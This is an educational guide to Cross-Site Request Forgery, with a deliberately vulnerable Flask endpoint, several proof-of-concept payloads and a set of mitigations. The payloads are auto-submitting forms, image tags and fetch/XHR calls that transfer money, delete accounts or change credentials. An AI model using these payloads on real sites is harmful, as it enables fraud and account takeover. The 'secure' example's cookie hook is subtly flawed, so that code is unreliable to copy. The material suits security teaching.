# Cross-Site Request Forgery (CSRF)

## Overview

Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to execute unwanted actions on a web application. Attackers exploit the trust that a web application has in the user's browser, leveraging existing authentication cookies to perform unauthorized actions.

**Severity**: Medium to High  
**OWASP Top 10**: A01:2021 - Broken Access Control  
**CWE**: CWE-352

## Technical Explanation

CSRF attacks work because browsers automatically include cookies with every request to a domain, regardless of where the request originates. When a user is authenticated to a web application, their session cookie is sent with all requests, including those initiated by malicious sites.

### Attack Prerequisites

1. User must be authenticated to the target application
2. Application relies solely on cookies for authentication
3. No CSRF protection mechanisms in place
4. Attacker knows the structure of the vulnerable request

### Attack Flow

1. Victim logs into legitimate website (bank.com)
2. Victim visits attacker's malicious website while still authenticated
3. Malicious site triggers a request to bank.com
4. Browser automatically includes victim's session cookie
5. Bank.com processes the request as legitimate

## Attack Scenario

Consider a banking application with a money transfer endpoint:

```python
# Vulnerable code - no CSRF protection
@app.route('/transfer', methods=['POST'])
def transfer_money():
    if not session.get('user_id'):
        return redirect('/login')
    
    to_account = request.form['to_account']
    amount = request.form['amount']
    
    # Process transfer
    execute_transfer(session['user_id'], to_account, amount)
    return "Transfer successful"
```

An attacker creates a malicious page:

```html
<!-- attacker.com/malicious.html -->
<html>
<body>
    <h1>You won a prize! Click here to claim</h1>
    <form id="csrf-form" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to_account" value="attacker_account">
        <input type="hidden" name="amount" value="10000">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

When a logged-in user visits this page, money is transferred without their knowledge.

## Proof of Concept

### 1. Basic CSRF Attack

```html
<!-- Malicious page hosted on attacker.com -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Card!</title>
</head>
<body>
    <h1>Claim Your $100 Gift Card</h1>
    
    <!-- Hidden form that auto-submits -->
    <form id="malicious" action="https://vulnerable-bank.com/api/transfer" method="POST">
        <input type="hidden" name="recipient" value="attacker123">
        <input type="hidden" name="amount" value="5000">
    </form>
    
    <script>
        // Auto-submit on page load
        document.getElementById('malicious').submit();
    </script>
</body>
</html>
```

### 2. CSRF via Image Tag

```html
<!-- GET-based CSRF (if application accepts GET for state-changing operations) -->
<img src="https://vulnerable-app.com/api/delete-account?confirm=yes" style="display:none">
```

### 3. CSRF with AJAX

```html
<script>
fetch('https://vulnerable-app.com/api/change-email', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@evil.com'
    })
});
</script>
```

### 4. CSRF via XMLHttpRequest

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://vulnerable-app.com/api/change-password', true);
xhr.withCredentials = true;  // Include cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('new_password=hacked123');
</script>
```

### 5. Social Engineering CSRF

```html
<!-- Disguised as legitimate action -->
<a href="https://vulnerable-app.com/api/add-admin?user=attacker">
    Click here to view your account statement
</a>
```

## Impact

- **Unauthorized Transactions**: Money transfers, purchases, payments
- **Account Takeover**: Email/password changes, adding attacker as admin
- **Data Modification**: Changing user settings, profile information
- **Privilege Escalation**: Adding administrative privileges to attacker account
- **Data Deletion**: Deleting user data, closing accounts
- **Malicious Actions**: Posting content, sending messages on behalf of victim

**Real-World Examples**:
- YouTube CSRF (2008): Arbitrary video uploads
- Netflix CSRF (2006): Account takeover
- ING Direct CSRF (2008): Unauthorized money transfers

## Mitigation

### 1. CSRF Tokens (Synchronizer Token Pattern)

```python
from flask import Flask, session, request, abort
import secrets

app = Flask(__name__)
app.secret_key = 'your-secret-key'

def generate_csrf_token():
    """Generate a unique CSRF token"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token():
    """Validate CSRF token from request"""
    token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
    if not token or token != session.get('csrf_token'):
        abort(403, "CSRF token validation failed")

@app.route('/transfer', methods=['POST'])
def transfer_money():
    validate_csrf_token()  # Validate before processing
    
    to_account = request.form['to_account']
    amount = request.form['amount']
    
    execute_transfer(session['user_id'], to_account, amount)
    return "Transfer successful"

# Make token available to templates
app.jinja_env.globals['csrf_token'] = generate_csrf_token
```

```html
<!-- Include token in forms -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input type="text" name="to_account" placeholder="Account">
    <input type="number" name="amount" placeholder="Amount">
    <button type="submit">Transfer</button>
</form>
```

### 2. SameSite Cookie Attribute

```python
from flask import Flask, make_response

@app.route('/login', methods=['POST'])
def login():
    # Authenticate user
    user_id = authenticate(request.form['username'], request.form['password'])
    
    response = make_response(redirect('/dashboard'))
    response.set_cookie(
        'session_id',
        value=generate_session_token(user_id),
        httponly=True,
        secure=True,
        samesite='Strict'  # or 'Lax' for better compatibility
    )
    return response
```

**SameSite Values**:
- `Strict`: Cookie never sent in cross-site requests
- `Lax`: Cookie sent with top-level navigations (GET requests)
- `None`: Cookie sent with all requests (requires Secure flag)

### 3. Double Submit Cookie Pattern

```python
import secrets

@app.route('/api/transfer', methods=['POST'])
def transfer_api():
    # Get token from cookie and request body/header
    cookie_token = request.cookies.get('csrf_token')
    request_token = request.headers.get('X-CSRF-Token')
    
    # Validate tokens match
    if not cookie_token or not request_token or cookie_token != request_token:
        abort(403, "CSRF validation failed")
    
    # Process request
    return jsonify({"success": True})

@app.route('/set-csrf-token')
def set_csrf_token():
    token = secrets.token_hex(32)
    response = make_response(jsonify({"token": token}))
    response.set_cookie('csrf_token', token, samesite='Strict')
    return response
```

```javascript
// Client-side: Include token in AJAX requests
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': getCookie('csrf_token')
    },
    body: JSON.stringify({to_account: '123', amount: 100})
});
```

### 4. Custom Request Headers

```python
@app.route('/api/transfer', methods=['POST'])
def transfer_api():
    # Require custom header (cannot be set by simple forms)
    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
        abort(403, "Invalid request")
    
    # Process request
    return jsonify({"success": True})
```

```javascript
// Client must explicitly set header
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({to_account: '123', amount: 100})
});
```

### 5. Origin and Referer Validation

```python
from urllib.parse import urlparse

@app.route('/transfer', methods=['POST'])
def transfer():
    # Validate Origin header
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')
    
    allowed_origins = ['https://bank.com', 'https://www.bank.com']
    
    if origin:
        if origin not in allowed_origins:
            abort(403, "Invalid origin")
    elif referer:
        referer_origin = f"{urlparse(referer).scheme}://{urlparse(referer).netloc}"
        if referer_origin not in allowed_origins:
            abort(403, "Invalid referer")
    else:
        abort(403, "Missing origin/referer header")
    
    # Process request
    return "Transfer successful"
```


## Secure Code Example

```python
from flask import Flask, request, session, jsonify, abort, render_template
from functools import wraps
import secrets
import hashlib
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# CSRF Token Management
class CSRFProtection:
    @staticmethod
    def generate_token():
        """Generate cryptographically secure CSRF token"""
        if 'csrf_token' not in session:
            session['csrf_token'] = secrets.token_hex(32)
            session['csrf_token_time'] = datetime.utcnow().isoformat()
        return session['csrf_token']
    
    @staticmethod
    def validate_token(token):
        """Validate CSRF token with time-based expiration"""
        if not token:
            return False
        
        session_token = session.get('csrf_token')
        token_time = session.get('csrf_token_time')
        
        if not session_token or token != session_token:
            return False
        
        # Check token age (expire after 1 hour)
        if token_time:
            token_datetime = datetime.fromisoformat(token_time)
            if datetime.utcnow() - token_datetime > timedelta(hours=1):
                return False
        
        return True
    
    @staticmethod
    def rotate_token():
        """Rotate CSRF token after successful use"""
        session.pop('csrf_token', None)
        session.pop('csrf_token_time', None)
        return CSRFProtection.generate_token()

def csrf_protect(f):
    """Decorator to protect endpoints from CSRF"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            # Get token from form or header
            token = (request.form.get('csrf_token') or 
                    request.headers.get('X-CSRF-Token'))
            
            if not CSRFProtection.validate_token(token):
                abort(403, "CSRF token validation failed")
        
        return f(*args, **kwargs)
    return decorated_function

# Configure secure session cookies
@app.after_request
def set_secure_cookies(response):
    """Set secure cookie attributes"""
    response.set_cookie(
        'session',
        secure=True,
        httponly=True,
        samesite='Strict'
    )
    return response

# Make CSRF token available to templates
@app.context_processor
def inject_csrf_token():
    return dict(csrf_token=CSRFProtection.generate_token)

# Protected endpoints
@app.route('/transfer', methods=['GET', 'POST'])
def transfer():
    if request.method == 'GET':
        return render_template('transfer.html')
    
    # POST request - validate CSRF
    token = request.form.get('csrf_token')
    if not CSRFProtection.validate_token(token):
        abort(403, "CSRF validation failed")
    
    # Validate user is authenticated
    if 'user_id' not in session:
        abort(401, "Authentication required")
    
    # Process transfer
    to_account = request.form.get('to_account')
    amount = request.form.get('amount')
    
    try:
        execute_transfer(session['user_id'], to_account, float(amount))
        
        # Rotate token after successful operation
        CSRFProtection.rotate_token()
        
        return jsonify({"success": True, "message": "Transfer completed"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 400

@app.route('/api/change-email', methods=['POST'])
@csrf_protect
def change_email():
    """API endpoint with CSRF protection"""
    if 'user_id' not in session:
        abort(401, "Authentication required")
    
    new_email = request.json.get('email')
    
    # Validate email format
    if not validate_email(new_email):
        abort(400, "Invalid email format")
    
    # Update email
    update_user_email(session['user_id'], new_email)
    
    return jsonify({"success": True, "message": "Email updated"})

@app.route('/api/delete-account', methods=['POST'])
@csrf_protect
def delete_account():
    """Sensitive operation with additional confirmation"""
    if 'user_id' not in session:
        abort(401, "Authentication required")
    
    # Require password confirmation for sensitive operations
    password = request.json.get('password')
    if not verify_password(session['user_id'], password):
        abort(403, "Password verification failed")
    
    # Delete account
    delete_user_account(session['user_id'])
    session.clear()
    
    return jsonify({"success": True, "message": "Account deleted"})

if __name__ == '__main__':
    app.run(ssl_context='adhoc')
```

```html
<!-- transfer.html template -->
<!DOCTYPE html>
<html>
<head>
    <title>Transfer Money</title>
</head>
<body>
    <h1>Transfer Money</h1>
    
    <form id="transfer-form" method="POST" action="/transfer">
        <!-- CSRF token included in form -->
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        
        <label>To Account:</label>
        <input type="text" name="to_account" required>
        
        <label>Amount:</label>
        <input type="number" name="amount" step="0.01" required>
        
        <button type="submit">Transfer</button>
    </form>
    
    <script>
        // For AJAX requests, include CSRF token in header
        function makeSecureRequest(url, data) {
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-Token': '{{ csrf_token() }}'
                },
                credentials: 'same-origin',
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
```

## Security Takeaways

1. **Use CSRF tokens**: Implement synchronizer token pattern for all state-changing operations
2. **SameSite cookies**: Set SameSite=Strict or Lax on session cookies
3. **Validate origin**: Check Origin and Referer headers for additional protection
4. **Use POST for state changes**: Never use GET requests for operations that modify data
5. **Custom headers for APIs**: Require custom headers that cannot be set by simple forms
6. **Token rotation**: Rotate CSRF tokens after sensitive operations
7. **Defense in depth**: Combine multiple CSRF protection mechanisms
8. **Framework features**: Use built-in CSRF protection in frameworks (Django, Rails, etc.)
9. **User confirmation**: Require password re-entry for critical operations
10. **Security testing**: Include CSRF testing in security assessments

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [MDN SameSite Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

